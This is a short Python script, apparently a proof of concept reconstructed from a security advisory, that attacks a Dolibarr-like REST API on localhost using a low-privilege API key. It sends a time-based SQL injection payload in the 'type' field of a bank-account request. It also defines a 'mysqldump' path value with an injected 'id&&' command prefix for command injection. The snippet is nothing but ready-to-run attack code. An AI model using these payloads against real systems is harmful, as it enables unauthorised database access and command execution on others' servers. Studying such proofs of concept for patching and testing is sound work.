import requests

# Reconstructed payloads from the advisory; this is not the author's script.
SYSTEMTOOLS_MYSQLDUMP = "id&&/usr/bin/mariadb-dump"
response = requests.post(
    "http://localhost:8089/api/index.php/thirdparties/1/bankaccounts",
    headers={"DOLAPIKEY": "lowprivkey1234567890abcdef12345678"},
    json={"type": "ban', (SELECT SLEEP(4)), 'x')-- -"},
)
